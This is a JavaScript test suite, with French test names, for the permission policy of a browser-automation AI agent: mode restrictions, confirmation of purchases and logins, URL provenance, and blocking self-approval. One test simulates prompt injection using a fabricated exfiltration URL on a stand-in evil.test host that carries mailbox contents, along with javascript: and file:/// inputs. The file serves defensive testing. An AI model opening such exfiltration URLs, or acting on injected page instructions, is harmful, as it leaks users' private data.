const test = require("node:test");
const assert = require("node:assert/strict");
const { TOOLS, validateToolCall, findTool } = require("../dist/browser/agent-tools.js");
const { BrowserAgent, UrlLedger, classifyClick, classifyType, decide } = require("../dist/browser/browser-agent.js");
const { DEFAULT_SETTINGS } = require("../dist/browser/browser-data-store.js");
const { unavailablePage } = require("../dist/browser/browser-extract.js");

const TAB = "3f2b8c1e-1c2d-4e5f-8a9b-0c1d2e3f4a5b";
const OTHER = "9a2b8c1e-1c2d-4e5f-8a9b-0c1d2e3f4a5b";

// ── Schémas et validation des arguments ────────────────────────────────────
test("les 19 outils demandés existent, avec un schéma fermé", () => {
  assert.deepEqual(TOOLS.map((t) => t.name).sort(), [
    "click_element", "close_tab", "compare_pages", "extract_links", "extract_tables", "find_text", "get_active_tab",
    "get_page_content", "get_page_metadata", "go_back", "go_forward", "new_tab", "open_url", "reload", "save_to_notebook",
    "scroll_page", "search_web", "take_screenshot", "type_text",
  ]);
  for (const tool of TOOLS) {
    assert.equal(tool.parameters.additionalProperties, false, tool.name);
    assert.ok(tool.parameters.required.every((key) => key in tool.parameters.properties), tool.name);
    for (const spec of Object.values(tool.parameters.properties)) if (spec.type === "string") assert.ok(spec.maxLength > 0, tool.name);
  }
  assert.deepEqual(TOOLS.filter((t) => t.readOnly).map((t) => t.name).sort(), [
    "compare_pages", "extract_links", "extract_tables", "find_text", "get_active_tab", "get_page_content", "get_page_metadata", "take_screenshot",
  ]);
  assert.equal(findTool("browser_open_url").name, "open_url");
  assert.equal(findTool("browser.open_url").name, "open_url");
});

test("validation stricte : rien n'est deviné ni corrigé", () => {
  const ok = validateToolCall("browser_open_url", '{"url":"https://example.com/"}');
  assert.deepEqual([ok.ok, ok.args], [true, { url: "https://example.com/" }]);
  assert.equal(validateToolCall("browser_get_active_tab", "").ok, true);
  const bad = [
    ["browser_exec", {}, "unknown_tool"],
    ["browser_open_url", {}, "missing_argument:url"],
    ["browser_open_url", { url: 42 }, "invalid_argument:url"],
    ["browser_open_url", { url: "https://a.test/", webContents: {} }, "unexpected_argument:webContents"],
    ["browser_open_url", { url: "https://a.test/\u0000" }, "invalid_argument:url"],
    ["browser_open_url", { url: "x".repeat(3000) }, "invalid_argument:url"],
    ["browser_open_url", "{pas du json", "invalid_json"],
    ["browser_open_url", "[1,2]", "arguments_must_be_object"],
    ["browser_open_url", "x".repeat(30_000), "arguments_too_large"],
    ["browser_scroll_page", { direction: "sideways" }, "invalid_argument:direction"],
    ["browser_type_text", { element: "e1", text: "a", submit: "true" }, "invalid_argument:submit"],
    ["browser_compare_pages", { tab_ids: [TAB] }, "invalid_argument:tab_ids"],
    ["browser_compare_pages", { tab_ids: [TAB, 5] }, "invalid_argument:tab_ids"],
    ["browser_save_to_notebook", { mode: "everything" }, "invalid_argument:mode"],
    [null, {}, "unknown_tool"],
  ];
  for (const [name, args, error] of bad) {
    const result = validateToolCall(name, args);
    assert.deepEqual([result.ok, result.error], [false, error], `${name} ${JSON.stringify(args).slice(0, 60)}`);
  }
});

// ── Politique ──────────────────────────────────────────────────────────────
test("actions sensibles : achat, paiement, envoi, publication, compte, suppression, téléchargement", () => {
  const el = (extra) => ({ found: true, tag: "button", label: "", formMethod: "", ...extra });
  for (const label of ["Acheter maintenant", "Payer 49 €", "Passer la commande", "Envoyer le message", "Publier", "Supprimer mon compte",
    "Se connecter", "S'inscrire", "Confirmer", "Télécharger", "Buy now", "Checkout", "Delete account", "Sign in", "Post", "Subscribe"]) {
    assert.ok(classifyClick(el({ label })), label);
  }
  for (const label of ["Voir les détails", "Page suivante", "Afficher", "En savoir plus", "Rechercher"]) assert.equal(classifyClick(el({ label })), null, label);
  assert.ok(classifyClick(el({ label: "OK", isSubmit: true, formMethod: "post" })));
  assert.ok(classifyClick(el({ label: "OK", isSubmit: true, formMethod: "get", formHasPassword: true })));
  assert.equal(classifyClick(el({ label: "Rechercher", isSubmit: true, formMethod: "get" })), null);
  assert.ok(classifyClick(el({ tag: "a", label: "rapport.pdf", download: true })));

  assert.ok(classifyType(el({ fieldSensitive: true }), false));
  assert.ok(classifyType(el({ formHasPayment: true }), false));
  assert.ok(classifyType(el({ formMethod: "post" }), true));
  assert.equal(classifyType(el({ formMethod: "get" }), true), null);
  assert.equal(classifyType(el({ formMethod: "post" }), false), null);
});

test("provenance des adresses : connue si écrite par l'utilisateur ou vue sur une page", () => {
  const ledger = new UrlLedger();
  ledger.addUserText("Compare https://shop.test/a et la page de lemonde.fr, merci.");
  ledger.addUrls(["https://docs.test/guide?page=2#intro"]);
  assert.equal(ledger.isKnown("https://shop.test/a"), true);
  assert.equal(ledger.isKnown("https://www.lemonde.fr/economie/article"), true, "domaine cité par l'utilisateur");
  assert.equal(ledger.isKnown("https://docs.test/guide?page=2"), true, "lien vu sur une page (fragment ignoré)");
  assert.equal(ledger.isKnown("https://docs.test/guide?page=3"), false, "adresse fabriquée sur un site déjà vu");
  assert.equal(ledger.isKnown("https://collecte.evil.test/vol?donnees=secret"), false);
  assert.equal(ledger.isKnown("https://shop.test.evil.test/a"), false);
  assert.equal(ledger.isKnown("pas une url"), false);
});

test("règle d'autorisation selon le mode", () => {
  const read = findTool("get_page_content"), click = findTool("click_element"), save = findTool("save_to_notebook");
  const d = (tool, mode, extra = {}) => decide({ tool, mode, confirmations: "sensitive-only", sensitive: null, unknownUrl: false, ...extra });
  for (const mode of ["observation", "assistance", "autonomous"]) assert.equal(d(read, mode), "allow");
  assert.equal(d(click, "observation"), "refuse");
  assert.equal(d(click, "observation", { sensitive: "x" }), "refuse");
  assert.equal(d(click, "assistance"), "confirm");
  assert.equal(d(click, "autonomous"), "allow");
  assert.equal(d(click, "autonomous", { sensitive: "achat" }), "confirm");
  assert.equal(d(click, "autonomous", { unknownUrl: true }), "confirm");
  assert.equal(d(click, "autonomous", { confirmations: "every-action" }), "confirm");
  assert.equal(d(save, "autonomous"), "confirm", "l'enregistrement dans le Notebook est toujours confirmé");
  assert.equal(d(save, "observation"), "refuse");
});

// ── Agent complet sur un navigateur simulé ─────────────────────────────────
function fakeBrowser(mode = "assistance", overrides = {}) {
  const browserRef = { self: null };
  const log = [];
  const tabs = [{ id: TAB, url: "https://shop.test/produit", title: "Produit", favicon: null, error: null },
    { id: OTHER, url: "https://mail.test/boite", title: "Messagerie", favicon: null, error: null }];
  const state = { element: { found: true, tag: "a", label: "Voir les détails", href: "https://shop.test/details", formMethod: "", signature: "sig-1" }, settings: { ...DEFAULT_SETTINGS, agentMode: mode } };
  const browser = {
    log, state,
    getSettings: () => state.settings,
    getState: () => ({ activeTabId: TAB, tabs, fullscreen: false, downloads: [] }),
    getTab: (id) => tabs.find((t) => t.id === id) ?? null,
    getActiveTabId: () => TAB,
    createTab: (o) => { log.push(["createTab", o.url]); return { id: OTHER, url: o.url }; },
    closeTab: (id) => { log.push(["closeTab", id]); return true; },
    navigate: (id, url) => { log.push(["navigate", url]); return true; },
    goBack: () => { log.push(["goBack"]); return true; }, goForward: () => true,
    reload: () => { log.push(["reload"]); return true; }, stop: () => { log.push(["stop"]); return true; },
    waitForLoad: async () => undefined,
    capture: async () => ({ dataUrl: "data:image/jpeg;base64,AAAA", width: 10, height: 5 }),
    extract: async (id) => ({ ...unavailablePage("https://shop.test/produit", "Produit", ""), status: "ok", text: `Texte de ${id}`, links: [{ text: "Détails", url: "https://shop.test/details" }] }),
    selection: async () => "texte sélectionné",
    actInPage: (...args) => browserRef.self.runInPage(...args),
    runInPage: async (_id, fn, arg) => {
      if (fn.name === "elementScript") {
        if (arg.action === "describe") return state.element;
        log.push([arg.action, arg.element, arg.text]);
        return arg.signature !== undefined && arg.signature !== state.element.signature ? { ...state.element, changed: true } : { ...state.element, done: true };
      }
      if (fn.name === "linksScript") return [{ text: "Résultat", url: "https://resultat.test/page" }];
      if (fn.name === "interactiveScript") return [{ ref: "e1", kind: "a", label: "Détails", href: "https://shop.test/details" }];
      if (fn.name === "findTextScript") return { count: 1, matches: ["…texte…"] };
      if (fn.name === "scrollScript") { log.push(["scroll", arg.direction]); return { scrollY: 100, maxScroll: 900 }; }
      throw new Error(`script inattendu ${fn.name}`);
    },
    ...overrides,
  };
  browserRef.self = browser;
  return browser;
}
const actions = (browser) => browser.log.map((entry) => entry[0]);

test("mode observation : lecture permise, toute action refusée et non exécutée", async () => {
  const browser = fakeBrowser("observation");
  const agent = new BrowserAgent(browser);
  agent.startMission("Résume cette page");
  assert.equal((await agent.call("browser_get_page_content", {})).status, "ok");
  assert.equal((await agent.call("browser_take_screenshot", {})).image.startsWith("data:image/jpeg"), true);
  for (const [name, args] of [["browser_open_url", { url: "https://shop.test/produit" }], ["browser_click_element", { element: "e1" }],
    ["browser_type_text", { element: "e1", text: "x" }], ["browser_new_tab", {}], ["browser_close_tab", {}], ["browser_search_web", { query: "x" }],
    ["browser_scroll_page", { direction: "down" }], ["browser_save_to_notebook", { mode: "link" }], ["browser_reload", {}]]) {
    const outcome = await agent.call(name, args);
    assert.deepEqual([outcome.status, outcome.error], ["refused", "observation_mode"], name);
  }
  assert.deepEqual(browser.log, [], "aucune action n'a atteint le navigateur");
});

test("mode assistance : chaque action attend la validation ; refus = rien n'est fait", async () => {
  const browser = fakeBrowser("assistance");
  const agent = new BrowserAgent(browser);
  agent.startMission("Ouvre la fiche détaillée");
  const asked = await agent.call("browser_click_element", { element: "e1" });
  assert.equal(asked.status, "confirmation_required");
  assert.match(asked.summary, /Cliquer sur « Voir les détails »/);
  assert.deepEqual(browser.log, [], "rien n'est exécuté avant la décision");

  const denied = await agent.resolve(asked.actionId, false);
  assert.deepEqual([denied.status, denied.error], ["denied", "user_denied"]);
  assert.deepEqual(browser.log, []);
  assert.equal((await agent.resolve(asked.actionId, true)).error, "expired", "une action refusée ne peut pas être rejouée");

  const again = await agent.call("browser_click_element", { element: "e1" });
  // Seule une approbation explicite (true) exécute l'action.
  assert.equal((await agent.resolve(again.actionId, "yes")).status, "denied");
  const third = await agent.call("browser_click_element", { element: "e1" });
  const done = await agent.resolve(third.actionId, true);
  assert.equal(done.status, "ok");
  assert.deepEqual(actions(browser), ["click"]);
});

test("mode autonome : actions courantes directes, actions sensibles et adresses inconnues confirmées", async () => {
  const browser = fakeBrowser("autonomous");
  const agent = new BrowserAgent(browser);
  agent.startMission("Va sur https://shop.test/produit et regarde les détails");
  assert.equal((await agent.call("browser_open_url", { url: "https://shop.test/produit" })).status, "ok");
  assert.equal((await agent.call("browser_click_element", { element: "e1" })).status, "ok");
  assert.equal((await agent.call("browser_scroll_page", { direction: "down" })).status, "ok");
  assert.deepEqual(actions(browser), ["navigate", "click", "scroll"]);

  browser.state.element = { found: true, tag: "a", label: "Acheter maintenant", href: "https://shop.test/merci", formMethod: "", signature: "sig-buy" };
  const buy = await agent.call("browser_click_element", { element: "Acheter maintenant" });
  assert.equal(buy.status, "confirmation_required");
  assert.match(buy.reason, /engageante/);

  browser.state.element = { found: true, tag: "input", type: "password", label: "Mot de passe", fieldSensitive: true, formMethod: "post", signature: "sig-pw" };
  assert.equal((await agent.call("browser_type_text", { element: "e2", text: "hunter2" })).status, "confirmation_required");

  // Saisie dans un champ ordinaire (recherche GET) : directe si le texte vient de la demande de l'utilisateur,
  // confirmée si l'assistant l'a rédigé lui-même (il pourrait y glisser des données lues dans un autre onglet).
  browser.state.element = { found: true, tag: "input", type: "search", label: "Recherche", formMethod: "get", signature: "sig-q" };
  agent.startMission("Cherche « ordinateur portable » sur ce site");
  assert.equal((await agent.call("browser_type_text", { element: "e3", text: "Ordinateur  portable", submit: true })).status, "ok");
  const leak = await agent.call("browser_type_text", { element: "e3", text: "contenu de la messagerie : code 4921", submit: true });
  assert.equal(leak.status, "confirmation_required");
  assert.match(leak.reason, /absent de votre demande/);

  const save = await agent.call("browser_save_to_notebook", { mode: "text" });
  assert.equal(save.status, "confirmation_required");
  const saved = await agent.resolve(save.actionId, true);
  assert.deepEqual([saved.status, saved.save.mode, saved.save.url], ["ok", "text", "https://shop.test/produit"]);
  assert.equal(actions(browser).filter((a) => a === "click").length, 1, "l'achat n'a pas été exécuté");
  assert.deepEqual(browser.log.filter((entry) => entry[0] === "type").map((entry) => entry[2]), ["Ordinateur  portable"],
    "ni le mot de passe ni le texte rédigé par l'assistant n'ont été saisis");
});

test("injection de prompt : une adresse d'exfiltration fabriquée n'est jamais ouverte sans l'utilisateur", async () => {
  for (const mode of ["assistance", "autonomous"]) {
    const browser = fakeBrowser(mode);
    const agent = new BrowserAgent(browser);
    agent.startMission("Résume cette recette");
    await agent.call("browser_get_page_content", {}); // la page (non fiable) est lue ; ses liens deviennent connus
    const exfil = "https://collecte.evil.test/vol?donnees=" + encodeURIComponent("contenu de la messagerie");
    for (const name of ["browser_open_url", "browser_new_tab"]) {
      const outcome = await agent.call(name, { url: exfil });
      assert.equal(outcome.status, "confirmation_required", `${mode} ${name}`);
      assert.match(outcome.reason, /absente de votre demande/);
    }
    assert.deepEqual(actions(browser).filter((a) => a === "navigate" || a === "createTab"), [], mode);
    // Un lien réellement présent sur la page reste utilisable en mode autonome.
    if (mode === "autonomous") assert.equal((await agent.call("browser_open_url", { url: "https://shop.test/details" })).status, "ok");
  }
  for (const url of ["file:///C:/Users/x/secret.txt", "javascript:alert(1)", "shop.test"]) {
    const agent = new BrowserAgent(fakeBrowser("autonomous"));
    agent.startMission("x");
    assert.deepEqual([(await agent.call("browser_open_url", { url })).status], ["refused"], url);
  }
});

test("le modèle ne peut ni changer de mode ni approuver lui-même une action", async () => {
  const browser = fakeBrowser("observation");
  const agent = new BrowserAgent(browser);
  agent.startMission("x");
  for (const name of ["browser_set_mode", "browser_update_settings", "browser_resolve", "browser_confirm", "agentResolve"]) {
    assert.equal((await agent.call(name, { mode: "autonomous", approve: true })).error, "unknown_tool", name);
  }
  assert.equal((await agent.call("browser_click_element", { element: "e1", approve: true })).status, "refused");
  assert.equal(browser.state.settings.agentMode, "observation");
});

test("interruption : arrêt immédiat, confirmations annulées, plus aucune action jusqu'au tour suivant", async () => {
  const browser = fakeBrowser("assistance");
  const agent = new BrowserAgent(browser);
  agent.startMission("Ouvre https://shop.test/produit");
  const waiting = await agent.call("browser_open_url", { url: "https://shop.test/produit" });
  agent.abort();
  assert.deepEqual(actions(browser), ["stop"], "le chargement en cours est arrêté");
  assert.equal((await agent.resolve(waiting.actionId, true)).error, "mission_aborted");
  assert.equal((await agent.call("browser_get_page_content", {})).error, "mission_aborted");
  assert.equal(actions(browser).includes("navigate"), false);
  agent.startMission("nouvelle demande");
  assert.equal((await agent.call("browser_get_page_content", {})).status, "ok");
});

test("substitution d'élément entre l'approbation et le clic : action annulée", async () => {
  const browser = fakeBrowser("assistance");
  const agent = new BrowserAgent(browser);
  agent.startMission("x");
  const asked = await agent.call("browser_click_element", { element: "e1" });
  browser.state.element = { found: true, tag: "button", label: "Payer 999 €", formMethod: "post", signature: "sig-autre" };
  const outcome = await agent.resolve(asked.actionId, true);
  assert.deepEqual([outcome.status, outcome.error], ["error", "element_changed"]);
});

test("page inaccessible : l'outil le dit, sans contenu", async () => {
  const browser = fakeBrowser("observation", { extract: async () => unavailablePage("https://down.test/", "Hors ligne", "page_load_failed") });
  const agent = new BrowserAgent(browser);
  agent.startMission("x");
  const outcome = await agent.call("browser_get_page_content", {});
  assert.equal(outcome.result.status, "unavailable");
  assert.equal(outcome.result.text, undefined);
  assert.match(outcome.result.note, /ne pas l'inventer/);
  assert.equal((await agent.call("browser_get_page_content", { tab_id: "inconnu" })).error, "tab_not_found");
});
